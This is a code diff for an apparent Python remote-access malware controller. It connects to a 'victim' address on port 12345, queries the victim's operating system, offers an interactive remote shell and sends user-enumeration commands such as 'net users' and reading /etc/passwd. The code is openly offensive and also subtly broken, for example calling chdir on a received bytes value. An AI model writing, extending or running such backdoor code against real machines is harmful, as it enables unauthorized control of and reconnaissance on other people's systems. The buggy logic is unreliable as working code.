@@ -15,7 +15,7 @@ class Shell:
     def receive(self):
         content = s.recv(4096).decode("utf-8")
         if content[2:] == "cd":
-            os.chdir(self.command[3:].decode("utf-8"))
+            malware_os.chdir(self.command[3:].decode("utf-8"))
         print(content)
 
     def history(self):
@@ -32,20 +32,31 @@ class Shell:
 
 class GetInfo:
 
-    def receive(self):
-        content = s.recv(4096).decode("utf-8")
-        print(content)
+    def __init__(self, malware_os):
+        self._os = malware_os
+
+    def get_users(self):
+        if self._os == "Windows":
+            return "net users"
+        elif self._os == "b'Linux'":
+            return "cut -d: -f1 /etc/passwd"
+
 
 malware_addr = input("Enter the address of the victim: ")
 serv_addr = (malware_addr, 12345)
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(serv_addr)
 print(s.recv(4096))
+s.send("os".encode("utf-8"))
+malware_os = s.recv(4096)
+
+getinfo = GetInfo(malware_os)
+shell = Shell()
+
 message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
-s.send(message.encode("utf-8"))
 while message != "exit":
     if message == "1":
-        shell = Shell()
         while shell.next_command:
                 shell.command = input("Shell: ")
                 while shell.command == "":
@@ -58,12 +69,12 @@ while message != "exit":
                     shell.send()
                     shell.receive()
     elif message == "2":
-        getinfo = GetInfo()
-        getinfo.receive()
+        shell.command = getinfo.get_users()
+        shell.send()
+        shell.receive()
 
 
     message = input("1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
-    s.send(message.encode("utf-8"))
 
 
 s.close()
